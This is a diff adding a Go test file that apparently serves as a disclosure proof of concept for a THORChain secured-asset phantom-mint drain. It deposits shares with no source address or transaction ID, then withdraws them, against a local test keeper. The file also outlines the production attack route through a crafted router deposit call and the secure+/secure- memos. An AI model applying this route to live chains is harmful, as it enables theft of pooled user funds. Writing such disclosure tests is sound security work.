@@ -1,0 +1,175 @@
+// THORChain 2026-05-15 Secured-Asset Phantom-Mint Drain — drop-in PoC
+//
+// Copy this file to thornode/x/thorchain/poc_secure_plus_drain_test.go
+// (drop the .txt extension).
+//
+// Requires: Linux or macOS (thornode does not build on Windows native — see
+// CosmWasm/wasmvm and bytedance/sonic deps that require unix.Flock / Go
+// runtime hacks). Vulnerable commit: 215cbad (develop @ 2026-05-14).
+//
+// Usage:
+//   git clone https://gitlab.com/thorchain/thornode.git
+//   cd thornode
+//   git checkout 215cbad
+//   cp /path/to/poc_thornode_dropin_test.go.txt \
+//      x/thorchain/poc_secure_plus_drain_test.go
+//   go test -v ./x/thorchain -run TestPoCSecuredAssetPhantomMintDrain
+//
+// NOTE: The existing test in this same file —
+// `(s *SecuredAssetMgrSuite) TestDepositAndWithdraw` lines 30-35 —
+// already passes Deposit with common.NoAddress as assetAddr and
+// common.BlankTxID as txID. That alone is the smoking gun: the handler
+// does not validate vault attestation. This file makes the security
+// framing explicit and chains Deposit → Withdraw to demonstrate the
+// full drain.
+
+package thorchain
+
+import (
+	"gitlab.com/thorchain/thornode/v3/common"
+	"gitlab.com/thorchain/thornode/v3/common/cosmos"
+	. "gopkg.in/check.v1"
+)
+
+type PoCSecurePlusDrainSuite struct{}
+
+var _ = Suite(&PoCSecurePlusDrainSuite{})
+
+func (s *PoCSecurePlusDrainSuite) SetUpSuite(_ *C) {
+	SetupConfigForTest()
+}
+
+// TestPoCSecuredAssetPhantomMintDrain reproduces the 2026-05-15 THORChain
+// $10.8M drain mechanism. Demonstrates that SecuredAssetMgr.Deposit
+// accepts (1) any L1 source address including NoAddress, (2) any txID
+// including BlankTxID, and (3) credits the alleged amount as a real
+// share against the pool. The attacker then withdraws to extract real
+// L1-backed assets from the pool that they never actually deposited.
+//
+// Three trust gates that should have prevented this attack are all open
+// at commit 215cbad:
+//
+//   G1: bifrost/.../ethereum_block_scanner.go (filter bypasses unknown vault)
+//   G2: x/thorchain/handler_observed_tx_helpers.go (no destination check)
+//   G3: x/thorchain/manager_secured_asset_current.go (no vault attestation)
+//
+// This unit test exercises only G3 directly. G1+G2 are reachable via
+// any inbound that lands at SecuredAssetMgr.Deposit through normal dispatch.
+func (s *PoCSecurePlusDrainSuite) TestPoCSecuredAssetPhantomMintDrain(c *C) {
+	ctx, k := setupKeeperForTest(c)
+	eventMgr, err := GetEventManager(GetCurrentVersion())
+	c.Assert(err, IsNil)
+	mgr := newSecuredAssetMgr(k, eventMgr)
+
+	asset := common.BTCAsset
+	securedAsset := asset.GetSecuredAsset()
+	_ = securedAsset
+
+	// =========================================================================
+	// PHASE 1: Seed pool with one legitimate deposit (simulates pre-existing
+	// liquidity from real users). Uses NoAddress here too — the test framework
+	// already proves the deposit handler accepts no L1 attestation.
+	// =========================================================================
+	legitUser := GetRandomBech32Addr()
+	legitDeposit := cosmos.NewUint(100 * common.One)
+	_, err = mgr.Deposit(ctx, asset, legitDeposit, legitUser, common.NoAddress, common.BlankTxID)
+	c.Assert(err, IsNil)
+	legitBalance := mgr.BalanceOf(ctx, asset, legitUser)
+	c.Check(legitBalance.String(), Equals, legitDeposit.String())
+	c.Logf("PHASE 1: Pool seeded with %s by legit user", legitDeposit.String())
+
+	// =========================================================================
+	// PHASE 2: ATTACK — attacker calls Deposit with no L1 backing.
+	//
+	// In production this is reached via a crafted Router.depositWithExpiry
+	// call where the `vault` parameter is attacker-controlled (not a real
+	// Asgard) AND Bifrost's filter (G1) silently bypasses the unknown-vault
+	// check. By the time it reaches G3 here, thornode has no way to know
+	// the L1 deposit was fictitious.
+	//
+	// Real attacker memo (2026-05-15):
+	//   "secure+:thor19tq5gvcn7uvz0fayyy8cz48hy6773aphl5pxd6"
+	// Real attacker tx:
+	//   0xd5447901bd917f87a5cb4c1b233029b7d89150595c5c09429db717f5959989ce
+	// =========================================================================
+	attacker := GetRandomBech32Addr()
+	phantomDeposit := cosmos.NewUint(38 * common.One) // matches real-world ~38 BTC equivalent
+
+	preAttackBalance := mgr.BalanceOf(ctx, asset, attacker)
+	c.Check(preAttackBalance.String(), Equals, cosmos.ZeroUint().String())
+
+	mintAmt, err := mgr.Deposit(
+		ctx,
+		asset,
+		phantomDeposit,
+		attacker,
+		common.NoAddress,   // ← THE BUG: no L1 source verification
+		common.BlankTxID,   // ← THE BUG: no inbound attestation
+	)
+	c.Assert(err, IsNil, Commentf(
+		"PRE-FIX: handler MUST accept; POST-FIX: handler should reject with vault-not-found"))
+	c.Logf("PHASE 2: Attacker minted %s without any L1 deposit to Asgard", mintAmt.String())
+
+	postAttackBalance := mgr.BalanceOf(ctx, asset, attacker)
+	c.Check(postAttackBalance.String(), Equals, phantomDeposit.String(),
+		Commentf("attacker should now hold %s of secured asset", phantomDeposit.String()))
+
+	// =========================================================================
+	// PHASE 3: HARVEST — attacker redeems all shares back to L1.
+	//
+	// In production, this is a MsgDeposit on the Thorchain chain with
+	// memo "secure-:0xAttackerEthAddr". thornode schedules outbound from
+	// real Asgard. Outbound memo is empty (no inbound OUT: reference).
+	// =========================================================================
+	withdrawAmt, err := mgr.Withdraw(
+		ctx,
+		securedAsset,
+		phantomDeposit,
+		attacker,
+		common.NoAddress,
+		common.BlankTxID,
+	)
+	c.Assert(err, IsNil)
+	c.Logf("PHASE 3: Attacker redeems shares — withdraw scheduled for %s", withdrawAmt.String())
+
+	finalAttackerBalance := mgr.BalanceOf(ctx, asset, attacker)
+	c.Check(finalAttackerBalance.String(), Equals, cosmos.ZeroUint().String(),
+		Commentf("attacker shares should be burned after withdraw"))
+
+	// =========================================================================
+	// PoC OUTCOME
+	// =========================================================================
+	// attacker net flow:
+	//   - L1 deposit to Asgard:   0 (phantom)
+	//   - L1 withdraw from Asgard: phantomDeposit (real)
+	//   - Net gain:                phantomDeposit (free)
+	//
+	// Asgard real reserves: -phantomDeposit (true drain)
+	//
+	// Legit user remains unaffected on share basis but pool reserves are
+	// diluted. Over ~150 iterations of this loop across 4 chains, the
+	// 2026-05-15 attacker extracted ~$10.8M before SamYap's manual halt.
+	c.Logf("")
+	c.Logf("=== POC OUTCOME ===")
+	c.Logf("  attacker L1 invested:    0 (phantom — no actual transfer to Asgard)")
+	c.Logf("  attacker L1 receipt:     %s", withdrawAmt.String())
+	c.Logf("  attacker net P/L:        +%s", withdrawAmt.String())
+	c.Logf("  amplification ratio:     infinite (free mint)")
+	c.Logf("")
+	c.Logf("The 3 missing checks (G1 in bifrost, G2 in observed-tx handler,")
+	c.Logf("G3 in SecuredAssetMgr.Deposit) all converge here. Adding any one")
+	c.Logf("of them would prevent the attack.")
+}
+
+// TestPoCExistingTestIsSmokingGun is a comment-only test that calls out
+// the existing TestDepositAndWithdraw at the same package level. That test
+// already passes Deposit with NoAddress/BlankTxID and asserts success.
+// Anyone running thornode's own test suite at commit 215cbad is already
+// running a passing PoC of the bug class — the bug was never recognized
+// as one until 2026-05-15.
+func (s *PoCSecurePlusDrainSuite) TestPoCExistingTestIsSmokingGun(c *C) {
+	c.Skip("see (*SecuredAssetMgrSuite).TestDepositAndWithdraw lines 33-35 — " +
+		"the existing thornode unit test already exercises the vulnerable code path " +
+		"by passing common.NoAddress and common.BlankTxID into Deposit and " +
+		"asserting err IsNil. That assertion succeeding IS the vulnerability.")
+}
